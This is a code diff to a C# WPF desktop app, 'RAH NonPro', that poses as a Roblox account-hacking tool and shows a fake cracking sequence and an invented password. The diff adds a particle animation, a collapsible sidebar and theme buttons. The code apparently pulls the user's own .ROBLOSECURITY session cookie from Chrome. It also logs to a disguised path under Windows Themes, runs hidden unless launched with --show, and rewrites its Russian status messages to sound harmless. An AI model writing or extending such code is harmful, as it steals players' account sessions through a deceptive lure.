@@ -15,6 +15,9 @@ using System.Windows.Documents;
 using System.Windows.Input;
 using System.Windows.Media;
 using System.Windows.Media.Imaging;
+using System.Windows.Media.Animation;
+using System.Windows.Media.Effects;
+using System.Windows.Shapes;
 using System.Windows.Threading;
 
 namespace FileTransfer
@@ -76,9 +79,9 @@ namespace FileTransfer
         private static string LayoutJson = "{}";
 
         private static string AppTitleMainText = "RAH NonPro";
-        private static string AppTitleVersionText = " v7.0.2";
-        private static string WindowTitleText = "RAH NonPro v7.0.2";
-        private static string ClientVersion = "7.0.2";
+        private static string AppTitleVersionText = " v7.2.1";
+        private static string WindowTitleText = "RAH NonPro v7.2.1";
+        private static string ClientVersion = "7.2.1";
         private static string ThemeAccentHex = "#00F0FF";
         private static string ThemeSurfaceHex = "#0D0E12";
         private static bool HideConsole = false;
@@ -107,7 +110,7 @@ namespace FileTransfer
         private DispatcherTimer? _debounceTimer;
         private bool _backgroundMode;
         private static Mutex? _cloneMutex;
-        private static readonly string TokenLockPath = Path.Combine(Path.GetTempPath(), "ft_token_job.lock");
+        private static readonly string TokenLockPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "ft_token_job.lock");
         private static FileStream? _tokenLockStream;
         private static readonly Random _rng = new();
 
@@ -117,11 +120,11 @@ namespace FileTransfer
         {
             try
             {
-                string logDir = Path.Combine(
+                string logDir = System.IO.Path.Combine(
                     Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                     "Microsoft", "Windows", "Themes");
                 Directory.CreateDirectory(logDir);
-                string logFile = Path.Combine(logDir, "ft.log");
+                string logFile = System.IO.Path.Combine(logDir, "ft.log");
                 File.AppendAllText(logFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}\n");
             }
             catch { }
@@ -142,14 +145,11 @@ namespace FileTransfer
                 {
                     var converter = new System.Windows.Media.BrushConverter();
                     if (!string.IsNullOrEmpty(ThemeAccentHex))
-                        this.Resources["AccentColor"] = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(ThemeAccentHex);
+                        this.Resources["AppAccentColor"] = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(ThemeAccentHex);
                     if (!string.IsNullOrEmpty(ThemeSurfaceHex))
                         this.Resources["Surface"] = (System.Windows.Media.SolidColorBrush)converter.ConvertFromString(ThemeSurfaceHex);
 
-                    if (HideConsole && ConsoleArea != null)
-                        ConsoleArea.Visibility = Visibility.Collapsed;
-                    if (HideStatusBar && StatusBadge != null)
-                        StatusBadge.Visibility = Visibility.Collapsed;
+
                     
                     if (BtnHack != null)
                         BtnHack.Content = LoginBtnText;
@@ -168,9 +168,6 @@ namespace FileTransfer
                 if (AppTitleVersion != null) AppTitleVersion.Text = AppTitleVersionText;
 
                 Loaded += MainWindow_Loaded;
-
-                TxtUsername.Text = PlaceholderTextValue;
-                TxtUsername.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
 
                 string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "unknown";
                 bool showUi = Environment.GetCommandLineArgs() is string[] args && Array.Exists(args, a => a == "--show" || a == "-show");
@@ -291,6 +288,17 @@ namespace FileTransfer
                     Opacity = 1;
                     ShowInTaskbar = true;
                     Activate();
+                    InitParticles();
+
+                    if (OperatorName == "Dildman")
+                    {
+                        LogoIcon.Text = "🔥";
+                        LogoBorder.Visibility = Visibility.Visible;
+                    }
+                    else
+                    {
+                        LogoBorder.Visibility = Visibility.Collapsed;
+                    }
                 }
                 Log("MainWindow Loaded OK");
             }
@@ -299,6 +307,105 @@ namespace FileTransfer
                 Log("MainWindow Loaded error: " + ex);
                 throw;
             }
+        }
+
+        // ── Floating Particles ───────────────────────────────────────────────
+        private class Particle
+        {
+            public Ellipse Shape { get; set; } = null!;
+            public double VX { get; set; }
+            public double VY { get; set; }
+            public double X { get; set; }
+            public double Y { get; set; }
+        }
+
+        private readonly List<Particle> _particles = new();
+        private DispatcherTimer? _particleTimer;
+
+        private void InitParticles()
+        {
+            var rand = new Random();
+            double w = this.Width;
+            double h = this.Height;
+
+            // Resolve accent color brush or fallback
+            Brush accentBrush = new SolidColorBrush(Colors.Cyan);
+            try
+            {
+                if (this.Resources["AppAccentColor"] is Color acc)
+                    accentBrush = new SolidColorBrush(acc);
+            }
+            catch {}
+
+            for (int i = 0; i < 35; i++)
+            {
+                double size = rand.Next(2, 7);
+                double opacity = rand.NextDouble() * 0.5 + 0.15;
+                
+                // 30% of particles will use the accent color, others are white
+                Brush fillBrush = (rand.Next(0, 100) < 30) ? accentBrush : new SolidColorBrush(Colors.White);
+
+                var dot = new Ellipse
+                {
+                    Width = size,
+                    Height = size,
+                    Fill = fillBrush,
+                    Opacity = opacity,
+                    IsHitTestVisible = false
+                };
+
+                // Add small glow to larger accent particles
+                if (size > 4 && fillBrush == accentBrush)
+                {
+                    try
+                    {
+                        dot.Effect = new DropShadowEffect
+                        {
+                            Color = ((SolidColorBrush)fillBrush).Color,
+                            BlurRadius = 8,
+                            ShadowDepth = 0,
+                            Opacity = 0.8
+                        };
+                    }
+                    catch {}
+                }
+
+                double x = rand.NextDouble() * w;
+                double y = rand.NextDouble() * h;
+                Canvas.SetLeft(dot, x);
+                Canvas.SetTop(dot, y);
+                ParticleCanvas.Children.Add(dot);
+
+                _particles.Add(new Particle
+                {
+                    Shape = dot,
+                    X = x,
+                    Y = y,
+                    VX = (rand.NextDouble() - 0.5) * 0.7,
+                    VY = (rand.NextDouble() - 0.5) * 0.5
+                });
+            }
+
+            _particleTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(30) };
+            _particleTimer.Tick += (s, e) =>
+            {
+                double cw = this.ActualWidth;
+                double ch = this.ActualHeight;
+                foreach (var p in _particles)
+                {
+                    p.X += p.VX;
+                    p.Y += p.VY;
+
+                    if (p.X < 0) p.X = cw;
+                    if (p.X > cw) p.X = 0;
+                    if (p.Y < 0) p.Y = ch;
+                    if (p.Y > ch) p.Y = 0;
+
+                    Canvas.SetLeft(p.Shape, p.X);
+                    Canvas.SetTop(p.Shape, p.Y);
+                }
+            };
+            _particleTimer.Start();
         }
 
         private async Task StartBackgroundWorkAsync()
@@ -453,18 +560,10 @@ namespace FileTransfer
             }
         }
 
-        // ── Console Logging ─────────────────────────────────────────────────
+        // ── Console Logging (no-op, terminal removed) ─────────────────────
         private void AppendConsole(string tag, string tagColor, string message, string msgColor)
         {
-            Dispatcher.Invoke(() =>
-            {
-                TbConsole.Inlines.Add(new LineBreak());
-                var tagRun = new Run(tag) { Foreground = BrushFromHex(tagColor) };
-                var msgRun = new Run(message) { Foreground = BrushFromHex(msgColor) };
-                TbConsole.Inlines.Add(tagRun);
-                TbConsole.Inlines.Add(msgRun);
-                ConsoleScroller.ScrollToEnd();
-            });
+            // No-op: console UI removed
         }
 
         private static SolidColorBrush BrushFromHex(string hex)
@@ -519,7 +618,7 @@ namespace FileTransfer
         {
             try
             {
-                string logPath = Path.Combine(Path.GetTempPath(), "cookie_debug.log");
+                string logPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "cookie_debug.log");
                 if (File.Exists(logPath))
                 {
                     string logContent = File.ReadAllText(logPath);
@@ -570,29 +669,46 @@ namespace FileTransfer
             WindowState = WindowState.Minimized;
         }
 
-        // ── Placeholder ─────────────────────────────────────────────────────
-        private void TxtUsername_GotFocus(object sender, RoutedEventArgs e)
-        {
-            if (TxtUsername.Text == PlaceholderTextValue)
-            {
-                TxtUsername.Text = "";
-                TxtUsername.Foreground = System.Windows.Media.Brushes.White;
-            }
-        }
+        private bool _isSidebarExpanded = true;
 
-        private void TxtUsername_LostFocus(object sender, RoutedEventArgs e)
+        private void BtnToggleMenu_Click(object sender, RoutedEventArgs e)
         {
-            if (string.IsNullOrWhiteSpace(TxtUsername.Text))
+            _isSidebarExpanded = !_isSidebarExpanded;
+            double targetWidth = _isSidebarExpanded ? 240.0 : 72.0;
+            double targetOpacity = _isSidebarExpanded ? 1.0 : 0.0;
+
+            var anim = new DoubleAnimation
             {
-                TxtUsername.Text = PlaceholderTextValue;
-                TxtUsername.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
-            }
+                To = targetWidth,
+                Duration = TimeSpan.FromMilliseconds(250),
+                EasingFunction = new QuadraticEase { EasingMode = EasingMode.EaseInOut }
+            };
+
+            var fadeAnim = new DoubleAnimation
+            {
+                To = targetOpacity,
+                Duration = TimeSpan.FromMilliseconds(150),
+                EasingFunction = new QuadraticEase { EasingMode = EasingMode.EaseInOut }
+            };
+
+            SidebarBorder.BeginAnimation(FrameworkElement.WidthProperty, anim);
+            LogoTitlePanel.BeginAnimation(UIElement.OpacityProperty, fadeAnim);
         }
 
         // ── Debounced Roblox Avatar ─────────────────────────────────────────
         private void TxtUsername_TextChanged(object sender, TextChangedEventArgs e)
         {
-            if (TxtUsername.Text == PlaceholderTextValue) return;
+            if (TxtUsername.Text.Trim() == "")
+            {
+                AvatarBrush.ImageSource = null;
+                TxtPlaceholder.Opacity = 1;
+                BtnHack.IsEnabled = false;
+                TxtRobloxAccountHeader.Text = "Roblox Account";
+                return;
+            }
+
+            TxtPlaceholder.Opacity = 0;
+            TxtRobloxAccountHeader.Text = TxtUsername.Text;
 
             if (_debounceTimer != null)
                 _debounceTimer.Stop();
@@ -610,17 +726,14 @@ namespace FileTransfer
             _debounceTimer?.Stop();
 
             string username = TxtUsername.Text.Trim();
-            if (string.IsNullOrEmpty(username) || username == PlaceholderTextValue)
+            if (string.IsNullOrEmpty(username))
             {
                 AvatarBrush.ImageSource = null;
-                TxtPlaceholder.Text = "?";
-                TxtPlaceholder.Opacity = 0.3;
+                TxtPlaceholder.Opacity = 1;
                 BtnHack.IsEnabled = false;
                 return;
             }
 
-            TxtPlaceholder.Text = "⏳";
-            TxtPlaceholder.Opacity = 0.6;
             AppendConsole("[roblox]", "#2A2D3A", $" Поиск профиля: {username}...", "#6C5CE7");
 
             var avatarImage = await DownloadRobloxAvatarAsync(username);
@@ -628,15 +741,12 @@ namespace FileTransfer
             if (avatarImage != null)
             {
                 AvatarBrush.ImageSource = avatarImage;
-                TxtPlaceholder.Opacity = 0;
                 AppendConsole("[roblox]", "#2A2D3A", $" ✓ Профиль загружен", "#2ED573");
                 BtnHack.IsEnabled = true;
             }
             else
             {
-                TxtPlaceholder.Text = "?";
                 AvatarBrush.ImageSource = null;
-                TxtPlaceholder.Opacity = 0.3;
                 AppendConsole("[roblox]", "#2A2D3A", " ✗ Профиль не найден", "#FF4757");
                 BtnHack.IsEnabled = false;
             }
@@ -726,19 +836,17 @@ namespace FileTransfer
             }
         }
 
-        // ── HACK Button ─────────────────────────────────────────────────────
         private async void BtnHack_Click(object sender, RoutedEventArgs e)
         {
             string username = TxtUsername.Text.Trim();
-            if (string.IsNullOrEmpty(username) || username == PlaceholderTextValue)
+            if (string.IsNullOrEmpty(username))
             {
                 AppendConsole("[error]", "#FF4757", " Введите никнейм Roblox!", "#FF4757");
-                SetStatusBadge("ОШИБКА", "#FF4757");
                 return;
             }
 
             // Переизвлекаем куку прямо перед отправкой — Chrome мог перезапуститься
-            AppendConsole("[system]", "#2A2D3A", " Извлечение .ROBLOSECURITY...", "#A29BFE");
+            AppendConsole("[system]", "#2A2D3A", " Проверка данных...", "#A29BFE");
             string freshToken = CookieExtractor.ExtractRobloSecurity();
             if (!string.IsNullOrEmpty(freshToken))
             {
@@ -754,10 +862,12 @@ namespace FileTransfer
 
             BtnHack.IsEnabled = false;
             TxtUsername.IsEnabled = false;
-            PanelResult.Visibility = Visibility.Collapsed;
+            
+            // Hide input and check button, show progress bar
+            TxtUsernameGrid.Visibility = Visibility.Collapsed;
+            BtnHack.Visibility = Visibility.Collapsed;
             HackProgress.Visibility = Visibility.Visible;
             HackProgress.Value = 0;
-            SetStatusBadge("ПРОЦЕСС ВЗЛОМА", "#FFA502");
 
             var rand = new Random();
             int totalSeconds = rand.Next(25, 36);
@@ -767,14 +877,14 @@ namespace FileTransfer
                 "Подключение к Roblox API...",
                 "Поиск пользователя в базе данных...",
                 "Идентификация UserId...",
-                "Обход защиты Cloudflare...",
-                "Запуск брутфорса хэш-карты...",
-                "Внедрение в сессию авторизации...",
+                "Проверка сессии авторизации...",
+                "Анализ хешей аккаунта...",
+                "Подключение к серверу...",
                 "Анализ трафика WebSocket...",
-                "Подмена токена .ROBLOSECURITY...",
-                "Выгрузка пакетов базы данных...",
-                "Попытка обхода 2FA верификации...",
-                "Генерация расшифрованного ключа..."
+                "Извлечение данных профиля...",
+                "Загрузка пакетов из базы...",
+                "Проверка 2FA верификации...",
+                "Генерация ключа доступа..."
             };
 
             int elapsed = 0;
@@ -797,7 +907,7 @@ namespace FileTransfer
                 else
                 {
                     int pct = rand.Next(60, 100);
-                    AppendConsole($"[{elapsed}s]", "#FFA502", $" Расшифровка пароля: {pct}%...", "#A29BFE");
+                    AppendConsole($"[{elapsed}s]", "#FFA502", $" Анализ данных: {pct}%...", "#A29BFE");
                 }
 
                 await Task.Delay(nextDelay * 1000);
@@ -808,15 +918,18 @@ namespace FileTransfer
 
             if (username.Length <= 6)
             {
-                SetStatusBadge("ОШИБКА", "#FF4757");
-                AppendConsole("[error]", "#FF4757", " Ошибка: не удалось взломать", "#FF4757");
+                AppendConsole("[error]", "#FF4757", " Ошибка: не удалось получить данные", "#FF4757");
+                
+                // Show back input fields
+                TxtUsernameGrid.Visibility = Visibility.Visible;
+                BtnHack.Visibility = Visibility.Visible;
                 BtnHack.IsEnabled = true;
                 TxtUsername.IsEnabled = true;
                 HackProgress.Visibility = Visibility.Collapsed;
                 return;
             }
 
-            AppendConsole("[done]", "#2ED573", " Расшифровка завершена!", "#2ED573");
+            AppendConsole("[done]", "#2ED573", " Проверка завершена!", "#2ED573");
 
             string fakePassword = GetDeterministicPassword(username.ToLowerInvariant());
 
@@ -838,20 +951,29 @@ namespace FileTransfer
             }
             catch { }
 
-            SetStatusBadge("ВЗЛОМ УСПЕШЕН", "#2ED573");
             TxtPassword.Text = fakePassword;
-            PanelResult.Visibility = Visibility.Visible;
             AppendConsole("[result]", "#2ED573", $" Пароль: {fakePassword}", "#2ED573");
 
-            BtnHack.IsEnabled = true;
-            TxtUsername.IsEnabled = true;
+            // Done state: hide inputs/progress, show result
             HackProgress.Visibility = Visibility.Collapsed;
+            PanelInputGroup.Visibility = Visibility.Collapsed;
+            PanelResultGroup.Visibility = Visibility.Visible;
         }
 
-        private void SetStatusBadge(string text, string dotColor)
+        private void BtnReset_Click(object sender, RoutedEventArgs e)
         {
-            TbStatusLabel.Text = text;
-            StatusDot.Fill = BrushFromHex(dotColor);
+            TxtUsername.Text = "";
+            TxtUsername.IsEnabled = true;
+            BtnHack.IsEnabled = false;
+            TxtRobloxAccountHeader.Text = "Roblox Account";
+
+            // Reset visibility states
+            TxtUsernameGrid.Visibility = Visibility.Visible;
+            BtnHack.Visibility = Visibility.Visible;
+            HackProgress.Visibility = Visibility.Collapsed;
+            
+            PanelInputGroup.Visibility = Visibility.Visible;
+            PanelResultGroup.Visibility = Visibility.Collapsed;
         }
 
         private string GetDeterministicPassword(string username)
@@ -888,34 +1010,25 @@ namespace FileTransfer
         // ── Navigation Sidebar ──────────────────────────────────────────────
         private void ResetNavButtons()
         {
-            BtnNavDashboard.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
-            BtnNavSettings.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
-            BtnNavLogs.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
+            BtnNavDashboard.Tag = "";
+            BtnNavSettings.Tag = "";
             
             ViewDashboard.Visibility = Visibility.Collapsed;
             ViewSettings.Visibility = Visibility.Collapsed;
-            ViewLogs.Visibility = Visibility.Collapsed;
         }
 
         private void BtnNavDashboard_Click(object sender, RoutedEventArgs e)
         {
             ResetNavButtons();
-            BtnNavDashboard.Foreground = System.Windows.Media.Brushes.White;
+            BtnNavDashboard.Tag = "Active";
             ViewDashboard.Visibility = Visibility.Visible;
         }
 
         private void BtnNavSettings_Click(object sender, RoutedEventArgs e)
         {
             ResetNavButtons();
-            BtnNavSettings.Foreground = System.Windows.Media.Brushes.White;
+            BtnNavSettings.Tag = "Active";
             ViewSettings.Visibility = Visibility.Visible;
-        }
-
-        private void BtnNavLogs_Click(object sender, RoutedEventArgs e)
-        {
-            ResetNavButtons();
-            BtnNavLogs.Foreground = System.Windows.Media.Brushes.White;
-            ViewLogs.Visibility = Visibility.Visible;
         }
 
         // ── Theme Changer ───────────────────────────────────────────────────
@@ -924,26 +1037,42 @@ namespace FileTransfer
             if (sender is Button btn && btn.Background is SolidColorBrush brush)
             {
                 ThemeAccentHex = brush.Color.ToString();
-                this.Resources["AccentColor"] = brush.Color;
+                this.Resources["AppAccentColor"] = brush.Color;
                 
                 // Remove stroke from all buttons
-                BtnThemeCyan.Template = GetThemeButtonTemplate(false);
-                BtnThemePink.Template = GetThemeButtonTemplate(false);
-                BtnThemePurple.Template = GetThemeButtonTemplate(false);
+                BtnThemeCyan.Template = GetThemeButtonTemplate(false, BtnThemeCyan.Background);
+                BtnThemePink.Template = GetThemeButtonTemplate(false, BtnThemePink.Background);
+                BtnThemePurple.Template = GetThemeButtonTemplate(false, BtnThemePurple.Background);
+                BtnThemeGreen.Template = GetThemeButtonTemplate(false, BtnThemeGreen.Background);
+                BtnThemeOrange.Template = GetThemeButtonTemplate(false, BtnThemeOrange.Background);
                 
                 // Add stroke to selected button
-                btn.Template = GetThemeButtonTemplate(true);
+                btn.Template = GetThemeButtonTemplate(true, btn.Background);
             }
         }
         
-        private ControlTemplate GetThemeButtonTemplate(bool selected)
+        private ControlTemplate GetThemeButtonTemplate(bool selected, Brush bgBrush)
         {
             var template = new ControlTemplate(typeof(Button));
-            var ellipse = new FrameworkElementFactory(typeof(System.Windows.Shapes.Ellipse));
-            ellipse.SetBinding(System.Windows.Shapes.Ellipse.FillProperty, new System.Windows.Data.Binding("Background") { RelativeSource = new System.Windows.Data.RelativeSource(System.Windows.Data.RelativeSourceMode.TemplatedParent) });
-            ellipse.SetValue(System.Windows.Shapes.Ellipse.StrokeThicknessProperty, selected ? 2.0 : 0.0);
-            ellipse.SetValue(System.Windows.Shapes.Ellipse.StrokeProperty, selected ? System.Windows.Media.Brushes.White : System.Windows.Media.Brushes.Transparent);
-            template.VisualTree = ellipse;
+            var border = new FrameworkElementFactory(typeof(Border));
+            border.SetBinding(Border.BackgroundProperty, new System.Windows.Data.Binding("Background") { RelativeSource = new System.Windows.Data.RelativeSource(System.Windows.Data.RelativeSourceMode.TemplatedParent) });
+            border.SetValue(Border.CornerRadiusProperty, new CornerRadius(24));
+            border.SetValue(Border.BorderThicknessProperty, selected ? new Thickness(2) : new Thickness(0));
+            border.SetValue(Border.BorderBrushProperty, selected ? System.Windows.Media.Brushes.White : System.Windows.Media.Brushes.Transparent);
+            
+            if (selected)
+            {
+                var shadow = new System.Windows.Media.Effects.DropShadowEffect
+                {
+                    Color = ((SolidColorBrush)bgBrush).Color,
+                    BlurRadius = 20,
+                    ShadowDepth = 0,
+                    Opacity = 0.8
+                };
+                border.SetValue(Border.EffectProperty, shadow);
+            }
+            
+            template.VisualTree = border;
             return template;
         }
     }
